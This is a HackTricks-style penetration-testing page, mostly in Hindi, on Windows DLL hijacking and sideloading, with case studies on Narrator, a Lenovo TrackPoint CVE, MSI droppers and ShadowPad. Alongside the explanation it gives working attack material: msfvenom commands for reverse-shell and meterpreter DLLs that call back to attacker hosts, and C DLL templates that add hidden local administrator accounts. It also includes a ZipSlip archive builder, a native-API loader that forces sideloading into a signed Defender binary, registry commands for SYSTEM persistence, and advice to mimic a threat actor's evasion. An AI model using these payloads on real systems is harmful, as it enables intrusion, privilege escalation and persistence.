# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking का मतलब है एक भरोसेमंद application को ऐसा मोड़ देना कि वह एक malicious DLL लोड कर ले। यह शब्द कई tactics को समाहित करता है जैसे कि **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यतः code execution, persistence हासिल करने और कम सामान्य रूप से privilege escalation के लिए उपयोग किया जाता है। यहाँ हालांकि फोकस escalation पर है, पर hijacking का तरीका उद्देश्य चाहे जो भी हो, समान रहता है।

### Common Techniques

DLL hijacking के लिए कई तरीके इस्तेमाल होते हैं, और हर एक की प्रभावशीलता उस application के DLL loading strategy पर निर्भर करती है:

1. **DLL Replacement**: असली DLL को बदलकर malicious DLL रखना, वैकल्पिक रूप से DLL Proxying का उपयोग करके मूल DLL की functionality बनाए रखना।
2. **DLL Search Order Hijacking**: malicious DLL को उस search path में रखना जो legitimate वाले से पहले आ रहा हो, ताकि एप्लिकेशन उसका उपयोग करे।
3. **Phantom DLL Hijacking**: ऐसा malicious DLL बनाना जिसे application लोड कर ले क्योंकि उसे लगता है कि वह एक आवश्यक पर मौजूद नहीं है।
4. **DLL Redirection**: search parameters जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलों को बदलकर एप्लिकेशन को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS directory में वास्तविक DLL की जगह malicious DLL रखना — यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को user-controlled डायरेक्टरी में रखना जहाँ application की कॉपी भी होती है, जो Binary Proxy Execution तकनीकों जैसा व्यवहार दिखाता है।

> [!TIP]
> DLL sideloading पर HTML staging, AES-CTR configs, और .NET implants जैसी तकनीकें layer करके एक step-by-step chain देखने के लिए नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

सिस्टम के अंदर missing Dlls खोजने का सबसे सामान्य तरीका [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (sysinternals) चलाना है, और **निम्नलिखित 2 filters** सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और सिर्फ **File System Activity** दिखाना:

![](<../../../images/image (153).png>)

यदि आप सामान्य रूप से **missing dlls** ढूँढ रहे हैं तो इसे कुछ **seconds** तक चलने दें।\
यदि आप किसी **विशेष executable** के अंदर missing dll ढूँढ रहे हैं तो आपको एक और filter सेट करना चाहिए, जैसे "Process Name" "contains" `<exec name>` , उसे execute करें, और events capture करना बंद कर दें।

## Exploiting Missing Dlls

Privilege escalate करने के लिए हमारी सबसे अच्छी उम्मीद यह है कि हम ऐसा **dll लिख सकें जिसे कोई privileged process लोड करने की कोशिश करेगा** और वे इसे किसी ऐसी जगह पर ढूँढे जहाँ हम लिख सकते हैं। इसलिए, हम या तो किसी उस **folder** में dll लिख पाएंगे जहाँ वह **original dll** वाली फ़ोल्डर से पहले search होगा (अजीब केस), या हम किसी ऐसी फ़ोल्डर में लिख पाएंगे जहाँ dll खोजा जाएगा और मूल **dll किसी भी फोल्डर में मौजूद नहीं होगा**।

### Dll Search Order

**Microsoft documentation** में आप देख सकते हैं कि Dlls कैसे specific रूप से लोड होते हैं: https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching

**Windows applications** DLLs को पहले से निर्धारित search paths के सेट का पालन करके ढूँढती हैं, एक विशिष्ट क्रम के अनुसार। DLL hijacking तब होती है जब एक हानिकारक DLL रणनीतिक रूप से उन directories में से किसी एक में रखा जाता है ताकि वह असली DLL से पहले लोड हो जाए। इसे रोकने का एक उपाय यह है कि एप्लिकेशन आवश्यक DLLs का उल्लेख करते समय absolute paths का उपयोग करे।

नीचे 32-bit सिस्टम्स पर **DLL search order** दिया गया है:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह **default** search order है जब **SafeDllSearchMode** enabled हो। जब यह disabled होता है तो current directory दूसरी जगह आ जाता है। इस feature को disable करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर इसे 0 पर सेट करें (default enabled होता है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ बुलाया जाता है तो search उस directory से शुरू होती है जहाँ executable module जिसे **LoadLibraryEx** लोड कर रहा है स्थित है।

अन्त में, ध्यान दें कि **एक dll केवल नाम बताकर नहीं बल्कि absolute path बताकर भी लोड किया जा सकता है**। उस स्थिति में वह dll केवल उसी path में ही खोजा जाएगा (यदि उस dll की कोई dependencies हैं, तो उन्हें नाम से लोड होने पर ही खोजा जाएगा)।

खोज क्रम को बदलने के और तरीके भी हैं पर उन पर मैं यहाँ विस्तार से नहीं जाऊँगा।

### Chaining an arbitrary file write into a missing-DLL hijack

1. ProcMon filters का उपयोग करें (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) ताकि वे DLL names मिल सकें जिन्हें process probe करता है पर नहीं पाता।
2. यदि binary एक **schedule/service** पर चलता है, तो इनमें से किसी नाम वाली DLL को **application directory** (search-order entry #1) में drop करने से वह अगली execution पर लोड हो जाएगी। एक .NET scanner केस में process ने `hostfxr.dll` को `C:\samples\app\` में खोजा इससे पहले कि वह असली copy को `C:\Program Files\dotnet\fxr\...` से लोड करे।
3. किसी payload DLL (उदा. reverse shell) को किसी भी export के साथ बनाएं: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. यदि आपकी primitive एक **ZipSlip-style arbitrary write** है, तो ऐसा ZIP तैयार करें जिसकी entry extraction dir से बाहर निकल जाए ताकि DLL app फ़ोल्डर में आ जाए:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Archive को watched inbox/share में deliver करें; जब scheduled task process को पुनः लॉन्च करेगा तो वह malicious DLL को लोड करेगा और service account के रूप में आपका कोड execute करेगा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath प्रदान करें जो आपके controlled folder की ओर इशारा करता हो (उदा., वह directory जहाँ आपका dropper/unpacker मौजूद है)।
- RtlCreateUserProcess के साथ process बनाएं। जब target binary किसी DLL को नाम से resolve करता है, तो loader resolution के दौरान इस supplied DllPath से consult करेगा, जिससे विश्वसनीय sideloading संभव हो जाती है भले ही malicious DLL target EXE के साथ colocated न हो।

Notes/limitations
- यह बनाए जा रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- लक्ष्य को नाम से किसी DLL को import या LoadLibrary करना चाहिए (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं कर रहा हो)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग का उदाहरण
- अपना malicious xmllite.dll (exporting the required functions or proxying to the real one) अपने DllPath डायरेक्टरी में रखें।
- ऊपर बताए गए तरीके का उपयोग करते हुए उस signed binary को लॉन्च करें जो नाम द्वारा xmllite.dll को खोजता है। The loader supplied DllPath के माध्यम से import को resolve करता है और आपका DLL sideloads कर लेता है।

यह तकनीक real-world में multi-stage sideloading chains चलाने के लिए देखी गई है: एक प्रारंभिक launcher एक helper DLL छोड़ता है, जो फिर एक Microsoft-signed, hijackable binary को spawn करता है जिसमें एक custom DllPath होता है ताकि attacker’s DLL को एक staging directory से लोड करने के लिये मजबूर किया जा सके।


#### Windows docs से dll search order पर अपवाद

Windows documentation में मानक DLL खोज क्रम पर कुछ अपवादों का उल्लेख है:

- जब किसी **DLL का नाम किसी ऐसे DLL के समान होता है जो पहले ही memory में लोड है**, तो सिस्टम सामान्य खोज को बाइपास कर देता है। इसके बजाय, यह redirection और एक manifest की जाँच करता है, और फिर memory में पहले से मौजूद DLL को default करता है। **इस स्थिति में, सिस्टम DLL की खोज नहीं करता है**।
- ऐसे मामलों में जहाँ DLL को current Windows version के लिए एक **known DLL** माना जाता है, सिस्टम उस known DLL के अपने संस्करण और उसके किसी भी dependent DLLs का उपयोग करेगा, **खोज प्रक्रिया को त्यागते हुए**। रजिस्ट्री कुंजी **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL के dependencies** हों, तो इन dependent DLLs की खोज इस तरह की जाती है जैसे उन्हें केवल उनके **module names** से सूचित किया गया हो, भले ही प्रारंभिक DLL को full path के माध्यम से पहचाना गया हो या नहीं।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसा process पहचानें जो अलग-अलग **privileges** पर चलता है या चलेगा (horizontal or lateral movement), और जिसमें **DLL की कमी** हो।
- सुनिश्चित करें कि उस किसी भी **directory** पर **write access** उपलब्ध हो जहाँ **DLL** की **खोज** की जाएगी। यह स्थान executable की directory या system path के भीतर किसी directory में हो सकता है।

हाँ, आवश्यकताओं को ढूँढना जटिल है क्योंकि **डिफ़ॉल्ट रूप से किसी privileged executable का DLL missing होना कुछ अजीब है** और system path फ़ोल्डर पर write permissions होना और भी **अजीब** है (आपको डिफ़ॉल्ट रूप से यह अनुमति नहीं मिलती)। परंतु, misconfigured environments में यह संभव है.\
यदि आप भाग्यशाली हैं और आवश्यकताओं को पूरा करते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही प्रोजेक्ट का **मुख्य लक्ष्य UAC bypass करना** हो, वहाँ आपको उस Windows version के लिए Dll hijacking का एक **PoC** मिल सकता है जिसे आप उपयोग कर सकते हैं (संभवतः बस उस फ़ोल्डर के path को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप **check your permissions in a folder** यह करके:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की अनुमतियाँ जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable के imports और एक dll के exports को निम्न के साथ भी जाँच कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
यदि आपके पास किसी **System Path folder** में लिखने की अनुमति के साथ **abuse Dll Hijacking to escalate privileges** के बारे में पूरी मार्गदर्शिका चाहिए तो देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जाँच करेगा कि क्या आपके पास system PATH के किसी फ़ोल्डर में लिखने की अनुमति है।\
इस भेद्यता का पता लगाने के लिए अन्य उपयोगी स्वचालित टूल **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_.

### Example

यदि आपको कोई exploitable scenario मिलता है तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण बातों में से एक यह होगी कि आप **create a dll that exports at least all the functions the executable will import from it**. वैसे भी, ध्यान दें कि Dll Hijacking [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) के लिए उपयोगी होता है। आप execution के लिए dll hijacking पर केंद्रित इस dll hijacking स्टडी में **how to create a valid dll** का एक उदाहरण पा सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
इसके अलावा, अगले सेक्शन में आप कुछ **basic dll codes** पा सकते हैं जो **templates** के रूप में उपयोगी हो सकते हैं या ऐसे **dll with non required functions exported** बनाने में मदद कर सकते हैं।

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

मूलतः एक **Dll proxy** वह Dll होता है जो लोड होने पर आपका malicious code execute कर सके, और साथ ही वास्तविक लाइब्रेरी को कॉल्स relay करके अपेक्षित व्यवहार को expose और work कर सके।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) टूल के साथ आप वास्तव में किसी executable को चुनकर वह library select कर सकते हैं जिसे आप proxify करना चाहते हैं और एक proxified dll generate कर सकते हैं, या Dll को indicate करके proxified dll generate कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मुझे x64 संस्करण नहीं मिला):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में जो Dll आप compile करते हैं उसे **export several functions** करना होगा जो victim process द्वारा लोड किए जाने वाले हैं; यदि ये functions मौजूद नहीं होंगे तो **binary won't be able to load** them और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उपयोगकर्ता निर्माण के साथ उदाहरण</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>थ्रेड एंट्री वाला वैकल्पिक C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी स्टार्ट पर एक अनुमानित, भाषा-विशेष localization DLL को प्रोब करता है जिसे hijack करके arbitrary code execution और persistence हासिल किया जा सकता है।

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore path पर एक writable attacker-controlled DLL मौजूद है, तो वह लोड होता है और `DllMain(DLL_PROCESS_ATTACH)` executes होता है। No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए path के लोड के प्रयास को देखें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC मौनता
- एक naive hijack UI को बोलने/हाइलाइट करने पर मजबूर करेगा। चुप रहने के लिए, attach होने पर Narrator थ्रेड्स की enumeration करें, मुख्य थ्रेड खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपनी थ्रेड में जारी रखें। पूर्ण कोड के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए सेटिंग के साथ, Narrator शुरू करने पर प्लांट की गई DLL लोड होती है। secure desktop (logon screen) पर CTRL+WIN+ENTER दबाकर Narrator शुरू करें; आपकी DLL secure desktop पर SYSTEM के रूप में चलती है।

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution तब बंद हो जाता है जब RDP session बंद हो—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator) क्लोन कर सकते हैं, उसे किसी arbitrary binary/DLL की ओर पॉइंट करने के लिए edit करें, import करें, फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के तहत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` के अंतर्गत लिखना और HKLM मान बदलना admin rights की आवश्यकता रखता है।
- सभी payload logic `DLL_PROCESS_ATTACH` में रह सकती है; कोई exports आवश्यक नहीं हैं।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` स्थित है `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोजाना 9:30 AM पर चलता है और logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable है, जिससे local users arbitrary files डाल सकते हैं।
- **DLL Search Behavior**: सबसे पहले अपने working directory से `hostfxr.dll` लोड करने का प्रयास करता है और अगर गायब है तो "NAME NOT FOUND" लॉग करता है, जो स्थानीय डायरेक्टरी खोज की प्राथमिकता को दर्शाता है।

### Exploit Implementation

एक attacker उसी डायरेक्टरी में एक malicious `hostfxr.dll` stub रख सकता है, और missing DLL का फायदा उठाकर user's context में code execution प्राप्त कर सकता है:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### आक्रमण प्रवाह

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. निर्धारित टास्क के वर्तमान उपयोगकर्ता के संदर्भ में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि टास्क के निष्पादन के समय प्रशासक लॉग इन है, तो दुर्भावनापूर्ण DLL प्रशासक के सत्र में medium integrity पर चलती है।
4. मध्यम integrity से SYSTEM privileges तक उन्नत करने के लिए मानक UAC bypass तकनीकों को श्रृंखला में जोड़ें।

## केस स्टडी: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors अक्सर MSI-आधारित droppers को DLL side-loading के साथ जोड़ते हैं ताकि payloads को एक trusted, signed process के तहत निष्पादित किया जा सके।

श्रृंखला अवलोकन
- उपयोगकर्ता MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (जैसे LaunchApplication या VBScript action), जो embedded resources से अगले चरण का पुनर्निर्माण करता है।
- Dropper उसी डायरेक्टरी में एक वैध, signed EXE और एक malicious DLL लिखता है (उदा.: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू होता है, Windows DLL search order पहले working directory से wsc.dll लोड करता है, जिससे attacker का कोड signed parent के अंतर्गत चल जाता है (ATT&CK T1574.001)。

MSI विश्लेषण (क्या ढूँढना है)
- CustomAction table:
- ऐसे एंट्रीज़ ढूंढें जो executables या VBScript चलाती हों। उदाहरण संदिग्ध पैटर्न: LaunchApplication जो बैकग्राउंड में एक embedded file को execute कर रहा हो।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence और Binary tables का निरीक्षण करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- ऐसे कई छोटे fragments ढूँढें जिन्हें VBScript CustomAction द्वारा concatenated और decrypted किया जाता है। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- इन दोनों फाइलों को एक ही फ़ोल्डर में रखें:
- wsc_proxy.exe: वैध रूप से साइन किया गया होस्ट (Avast). यह प्रक्रिया अपने डायरेक्टरी से नाम के आधार पर wsc.dll लोड करने का प्रयास करती है।
- wsc.dll: attacker DLL. यदि किसी विशिष्ट exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और DllMain में payload चलाते हुए आवश्यक exports को मूल लाइब्रेरी को फॉरवर्ड करें।
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- निर्यात आवश्यकताओं के लिए, एक प्रॉक्सिंग फ़्रेमवर्क (उदा., DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL जनरेट हो जो आपका payload भी execute करे।

- यह तकनीक host binary द्वारा DLL नाम समाधान (name resolution) पर निर्भर करती है। अगर host absolute paths या safe loading फ़्लैग्स (उदा., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है तो hijack विफल हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और इन्हें host binary और export सेट चुनते समय ध्यान में रखना चाहिए।

## साइन किए गए त्रि-फाइल सेट + एन्क्रिप्टेड payloads (ShadowPad केस स्टडी)

Check Point ने बताया कि Ink Dragon कैसे ShadowPad को deploy करता है—एक **three-file triad** का इस्तेमाल करते हुए ताकि यह वैध सॉफ़्टवेयर में मिल जाए और core payload डिस्क पर एन्क्रिप्टेड रहे:

1. **Signed host EXE** – AMD, Realtek, या NVIDIA जैसे vendors की बाइनरीज़ का दुरुपयोग (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). attackers executable का नाम बदलते हैं ताकि वह Windows बाइनरी जैसा दिखे (उदा. `conhost.exe`), पर Authenticode signature वैध बनी रहती है।
2. **Malicious loader DLL** – EXE के बगल में अपेक्षित नाम के साथ ड्रॉप की जाती है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL आमतौर पर ScatterBrain framework से obfuscated MFC बाइनरी होती है; इसका एकमात्र काम encrypted blob ढूंढना, उसे decrypt करना, और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी डायरेक्टरी में `<name>.tmp` के रूप में स्टोर किया जाता है। decrypted payload को memory-map करने के बाद loader TMP फ़ाइल को forensic सबूत नष्ट करने के लिए डिलीट कर देता है।

Tradecraft notes:

* साइन किए गए EXE का नाम बदलना (जबकि PE header में OriginalFileName को बरकरार रखा गया हो) उसे Windows बाइनरी की तरह छिपाने देता है पर vendor signature को बनाए रखता है, इसलिए Ink Dragon की आदत की नकल करें कि वे `conhost.exe`-जैसी दिखने वाली बाइनरीज़ छोड़ते हैं जो असल में AMD/NVIDIA utilities होती हैं।
